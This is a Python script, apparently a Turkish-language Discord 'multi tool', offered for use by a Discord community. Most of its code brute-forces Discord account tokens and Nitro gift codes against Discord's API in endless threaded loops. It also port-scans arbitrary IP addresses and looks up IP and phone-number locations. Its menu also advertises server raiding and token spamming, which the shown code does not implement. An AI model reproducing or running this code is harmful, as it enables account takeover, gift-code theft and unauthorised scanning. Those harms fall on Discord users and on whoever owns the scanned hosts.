# -----------------------------------------------------------------------
# Copyright (c) 2025 Ecazen - discord.gg/ecazen
# Bu araç Özel Lisans Sözleşmesi ile korunmaktadır. 
# İzinsiz kopyalanması, satılması veya paylaşılması yasaktır.
# -----------------------------------------------------------------------

# ZAZAKOC TARAFINDAN DİSCORD.GG/ECAZEN İÇİN YAPILMIŞ, DİZAYN EDİLMİŞ BİR MULTİ TOOLDUR.
# BÜTÜN HAKLARI SAKLIDIR
# TELİF HAKKI MEVCUTTUR
# DESTEK İÇİN DİSCORD.GG/ECAZEN
# KULLANIM VE DEĞİŞTİRME HAKKI YANLIZCA ZAZAKOC'A AİTTİR
# TOOL'UN İZİNSİZ SATIŞI SONUCUNDA TOOL İÇİN GEREKLİ OLAN APİ LER DEVRE DIŞI BIRAKILACAKTIR 

import os
import sys
import time
import random
import string
import json
import threading
import socket
import ssl
import subprocess
import concurrent.futures

# Gerekli kütüphaneleri kontrol edin aq!
try:
    import requests
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
except:
    os.system("pip install requests phonenumbers")
    import requests
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone

reset = "\033[0m"
red = "\033[1;31m"
green = "\033[1;32m"
white = "\033[1;37m"
blue = "\033[1;34m"
yellow = "\033[1;33m"

BEFORE = f"{red}[{white}"
AFTER = f"{red}]{white}"
BEFORE_GREEN = f"{green}[{white}"
AFTER_GREEN = f"{green}]{white}"
GEN_VALID = f"{green}Valid{white}"
GEN_INVALID = f"{red}Invalid{white}"
INPUT = f"{blue}Input{white}"
WAIT = f"{yellow}Wait{white}"
INFO = f"{blue}Info{white}"
ERROR = f"{red}Error{white}"
ADD = f"{green}+{white}"
INFO_ADD = f"{red}[{white}+{red}]{white}"

def current_time_hour(): return time.strftime("%H:%M:%S")
def Title(text): os.system(f"title {text}") if os.name == 'nt' else None

def ip_generator():
    Title("Ip Generator")
    amount = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Kaç adet IP üretilsin? -> {reset}"))
    
    for _ in range(amount):
       
        generated_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
     
        print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Generated IP: {white}{generated_ip}{reset}")
    
    input(f"\n{BEFORE} Devam etmek için ENTER'a basın...")

def phone_lookup():
    Title("Phone Lookup")
    phone_number = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT} Telefon Numarası (+90...): {reset}")
    print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Bilgiler sorgulanıyor...")
    
    try:
        parsed_number = phonenumbers.parse(phone_number)
        if phonenumbers.is_valid_number(parsed_number):
            location = geocoder.description_for_number(parsed_number, "tr")
            operator = carrier.name_for_number(parsed_number, "tr")
            time_zones = timezone.time_zones_for_number(parsed_number)
            
            print(f"\n{INFO_ADD} Geçerli     : {white}Evet{red}")
            print(f"{INFO_ADD} Ülke/Bölge : {white}{location}{red}")
            print(f"{INFO_ADD} Operatör   : {white}{operator}{red}")
            print(f"{INFO_ADD} Saat Dilimi: {white}{time_zones}{red}")
        else:
            print(f"{ERROR} Geçersiz numara formatı!")
    except Exception as e:
        print(f"{ERROR} Hata: {str(e)}")
    
    input("\nENTER...")

def discord_token_generator():
    Title("Discord Token Generator")
    threads_number = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Threads Number -> {reset}"))

    def token_check():
        token = "".join(random.choices(string.ascii_letters + string.digits, k=24)) + "." + "".join(random.choices(string.ascii_letters + string.digits, k=6)) + "." + "".join(random.choices(string.ascii_letters + string.digits + "-_", k=38))
        try:
            response = requests.get('https://discordapp.com/api/v9/users/@me', headers={'Authorization': token})
            if response.status_code == 200:
                print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Status: {white}Valid{green} Token: {white}{token}{green}")
            else:
                print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {white}Invalid{red} Token: {white}{token}{red}")
        except:
            print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {white}Error{red} Token: {white}{token}{red}")

    while True:
        threads = [threading.Thread(target=token_check) for _ in range(threads_number)]
        for t in threads: t.start()
        for t in threads: t.join()

def discord_nitro_generator():
    Title("Discord Nitro Generator")
    threads_number = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Threads Number -> {reset}"))

    def nitro_check():
        code_nitro = ''.join([random.choice(string.ascii_uppercase + string.digits) for _ in range(16)])
        url_nitro = f'https://discord.gift/{code_nitro}'
        try:
            response = requests.get(f'https://discordapp.com/api/v6/entitlements/gift-codes/{code_nitro}?with_application=false&with_subscription_plan=true', timeout=1)
            if response.status_code == 200:
                print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Status: {white}Valid{green} Nitro: {white}{url_nitro}{reset}")
            else:
                print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {white}Invalid{red} Nitro: {white}{url_nitro}{reset}")
        except: pass

    while True:
        threads = [threading.Thread(target=nitro_check) for _ in range(threads_number)]
        for t in threads: t.start()
        for t in threads: t.join()

def ip_scanner():
    Title("Ip Scanner")
    ip = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Ip -> {reset}")
    print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Bilgiler taranıyor..{reset}")
    for port in [21, 22, 80, 443, 3306, 3389]:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((ip, port))
        if result == 0:
            print(f"{BEFORE + current_time_hour() + AFTER} {ADD} Port: {white}{port}{red} Status: {white}Open{reset}")
        sock.close()
    input(f"\n{BEFORE} Devam etmek için ENTER'a basın...")

def ip_lookup():
    Title("Ip Lookup")
    ip = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT} Ip -> {reset}")
    try:
        api = requests.get(f"http://ip-api.com/json/{ip}").json()
        print(f"{INFO_ADD} Status    : {white}{api.get('status')}{red}")
        print(f"{INFO_ADD} Country   : {white}{api.get('country')}{red}")
        print(f"{INFO_ADD} City      : {white}{api.get('city')}{red}")
        print(f"{INFO_ADD} Isp       : {white}{api.get('isp')}{red}")
    except: print(f"{ERROR} Bilgi alınamadı.")
    input("\nENTER...")

# --- giriş menüsü işte aq ---
def main_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
{red}  ███████╗ ██████╗ █████╗ ███████╗███████╗███╗   ██╗
  ██╔════╝██╔════╝██╔══██╗╚══███╔╝██╔════╝████╗  ██║
  █████╗  ██║     ███████║  ███╔╝ █████╗  ██╔██╗ ██║
  ██╔══╝  ██║     ██╔══██║ ███╔╝  ██╔══╝  ██║╚██╗██║
  ███████╗╚██████╗██║  ██║███████╗███████╗██║ ╚████║
  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝
          {white}Ecazen Generator Tools - Multi Edition{reset}
{white}────────────────────────────────────────────────────────{reset}
{red}[1]{white} Discord Nitro Gen      {red}[6]{white} Ip Scanner
{red}[2]{white} Discord Token Gen      {red}[7]{white} Ip Generator
{red}[3]{white} Discord Token Joiner   {red}[8]{white} Ip Lookup
{red}[4]{white} Server Raid            {red}[9]{white} Ip Pinger
{red}[5]{white} Token Spammer          {red}[10]{white} Phone Lookup
{red}[0]{white} Exit
{white}────────────────────────────────────────────────────────{reset}""")
        
        choice = input(f"{BEFORE} Ecazen {AFTER} Choice -> ")

        if choice == '1': discord_nitro_generator()
        elif choice == '2': discord_token_generator()
        elif choice == '6': ip_scanner()
        elif choice == '7': ip_generator()
        elif choice == '8': ip_lookup()
        elif choice == '10': phone_lookup()
        elif choice == '0': sys.exit()

if __name__ == "__main__":
    main_menu()